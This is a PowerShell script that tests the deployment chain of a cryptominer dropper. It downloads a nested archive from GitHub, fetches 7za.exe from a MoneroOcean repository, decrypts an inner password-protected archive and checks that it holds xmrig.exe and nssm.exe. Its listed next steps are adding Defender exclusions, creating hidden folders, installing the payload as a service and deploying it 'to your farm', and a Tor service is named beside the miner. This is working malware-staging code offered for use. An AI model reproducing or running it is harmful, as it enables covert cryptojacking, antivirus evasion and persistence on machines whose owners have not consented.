# ============================================
# TEST DEPLOYMENT SCRIPT
# Use this to test your GitHub-hosted red.7z
# ============================================

# CONFIGURATION - CHANGE THESE!
$Red7zUrl = "https://raw.githubusercontent.com/flanker411/logs/refs/heads/main/red.7z"  # YOUR URL HERE
$DecryptionPassword = "red!"  # MUST match what you used for grey.7z

# Test service names (use obvious names for testing)
$ServiceNameXMRig = "TestMinerService"
$ServiceNameTor = "TestTorService"

Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "  TESTING GITHUB DEPLOYMENT" -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Download URL: $Red7zUrl" -ForegroundColor Yellow
Write-Host ""

# Check if running as Admin
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "WARNING: Not running as Administrator. Some features may fail." -ForegroundColor Red
    Write-Host "Right-click PowerShell and select 'Run as Administrator' for full testing." -ForegroundColor Yellow
    pause
}

# Create test directory
$TestDir = "$env:TEMP\miner_test_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
New-Item -Path $TestDir -ItemType Directory -Force | Out-Null
Write-Host "[*] Test directory: $TestDir" -ForegroundColor Gray

# Download red.7z
$Red7zLocal = "$TestDir\red.7z"
Write-Host ""
Write-Host "[1] Downloading red.7z from GitHub..." -ForegroundColor Yellow

try {
    Invoke-WebRequest -Uri $Red7zUrl -OutFile $Red7zLocal -UseBasicParsing
    Write-Host "[+] Download successful! Size: $((Get-Item $Red7zLocal).Length) bytes" -ForegroundColor Green
} catch {
    Write-Host "[-] Download failed: $_" -ForegroundColor Red
    Write-Host ""
    Write-Host "Troubleshooting:" -ForegroundColor Yellow
    Write-Host "1. Is the URL correct? Try opening it in browser" -ForegroundColor Gray
    Write-Host "2. Is the repository public?" -ForegroundColor Gray
    Write-Host "3. GitHub may block automated downloads - try using 'raw.githubusercontent.com' URL" -ForegroundColor Gray
    pause
    exit 1
}

# Check if we have 7za.exe (download bootstrap if needed)
Write-Host ""
Write-Host "[2] Getting 7za.exe..." -ForegroundColor Yellow

$Bootstrap7z = "$TestDir\7za.exe"
if (-not (Test-Path $Bootstrap7z)) {
    # Try to get from red.7z first (will need 7z to extract... chicken-egg)
    # For testing, download from official source
    $SevenZipUrl = "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe"
    try {
        Invoke-WebRequest -Uri $SevenZipUrl -OutFile $Bootstrap7z -UseBasicParsing
        Write-Host "[+] Downloaded bootstrap 7za.exe" -ForegroundColor Green
    } catch {
        Write-Host "[-] Cannot download 7za.exe. Please place 7za.exe in $TestDir manually" -ForegroundColor Red
        pause
        exit 1
    }
}

# Extract red.7z
Write-Host ""
Write-Host "[3] Extracting red.7z..." -ForegroundColor Yellow
$ExtractDir = "$TestDir\red_extracted"
New-Item -Path $ExtractDir -ItemType Directory -Force | Out-Null

& $Bootstrap7z x -y -o"$ExtractDir" $Red7zLocal | Out-Null

if ($LASTEXITCODE -eq 0) {
    Write-Host "[+] red.7z extracted successfully" -ForegroundColor Green
} else {
    Write-Host "[-] Failed to extract red.7z" -ForegroundColor Red
    pause
    exit 1
}

# Find grey.7z
Write-Host ""
Write-Host "[4] Looking for grey.7z..." -ForegroundColor Yellow
$Grey7z = Get-ChildItem -Path $ExtractDir -Recurse -Filter "*.7z" | Where-Object { $_.Name -ne "red.7z" -and $_.Name -like "*grey*" } | Select-Object -First 1 -ExpandProperty FullName

if (-not $Grey7z) {
    # Try any 7z file
    $Grey7z = Get-ChildItem -Path $ExtractDir -Recurse -Filter "*.7z" | Select-Object -First 1 -ExpandProperty FullName
}

if ($Grey7z) {
    Write-Host "[+] Found grey.7z at: $Grey7z" -ForegroundColor Green
    Write-Host "    File size: $((Get-Item $Grey7z).Length) bytes" -ForegroundColor Gray
} else {
    Write-Host "[-] Could not find grey.7z in extracted files!" -ForegroundColor Red
    Write-Host "[*] Contents of $ExtractDir:" -ForegroundColor Yellow
    Get-ChildItem -Path $ExtractDir -Recurse | ForEach-Object { Write-Host "    $($_.FullName)" }
    pause
    exit 1
}

# Decrypt and extract grey.7z
Write-Host ""
Write-Host "[5] Decrypting and extracting grey.7z..." -ForegroundColor Yellow

$PayloadDir = "$TestDir\payload"
New-Item -Path $PayloadDir -ItemType Directory -Force | Out-Null

& $Bootstrap7z x -y -p"$DecryptionPassword" -o"$PayloadDir" $Grey7z | Out-Null

if ($LASTEXITCODE -eq 0) {
    Write-Host "[+] grey.7z decrypted and extracted successfully!" -ForegroundColor Green
} else {
    Write-Host "[-] Failed to decrypt grey.7z. Check password!" -ForegroundColor Red
    Write-Host "    Password used: $DecryptionPassword" -ForegroundColor Yellow
    pause
    exit 1
}

# List extracted payload files
Write-Host ""
Write-Host "[6] Extracted payload files:" -ForegroundColor Yellow
$files = Get-ChildItem -Path $PayloadDir -Recurse -File
foreach ($file in $files) {
    Write-Host "    ✓ $($file.Name) ($([math]::Round($file.Length/1KB, 2)) KB)" -ForegroundColor Green
}

# Verify critical files
Write-Host ""
Write-Host "[7] Verifying payload..." -ForegroundColor Yellow
$requiredFiles = @("xmrig.exe", "nssm.exe")
$allFound = $true

foreach ($file in $requiredFiles) {
    if (Test-Path "$PayloadDir\$file") {
        Write-Host "    ✓ $file found" -ForegroundColor Green
    } else {
        Write-Host "    ✗ $file MISSING" -ForegroundColor Red
        $allFound = $false
    }
}

if ($allFound) {
    Write-Host ""
    Write-Host "==========================================" -ForegroundColor Green
    Write-Host "  TEST PASSED!" -ForegroundColor Green
    Write-Host "==========================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "Your nested 7z structure works correctly!" -ForegroundColor White
    Write-Host ""
    Write-Host "Next steps:" -ForegroundColor Yellow
    Write-Host "1. Update the script with your real service names" -ForegroundColor Gray
    Write-Host "2. Add Defender exclusions and hidden folder creation" -ForegroundColor Gray
    Write-Host "3. Test service installation with nssm" -ForegroundColor Gray
    Write-Host "4. Deploy to your farm" -ForegroundColor Gray
} else {
    Write-Host ""
    Write-Host "==========================================" -ForegroundColor Red
    Write-Host "  TEST FAILED" -ForegroundColor Red
    Write-Host "==========================================" -ForegroundColor Red
    Write-Host ""
    Write-Host "Missing required files. Check your grey.7z contents." -ForegroundColor White
}

Write-Host ""
Write-Host "Test files saved in: $TestDir" -ForegroundColor Gray
Write-Host "You can delete this folder when done." -ForegroundColor Gray
Write-Host ""
pause
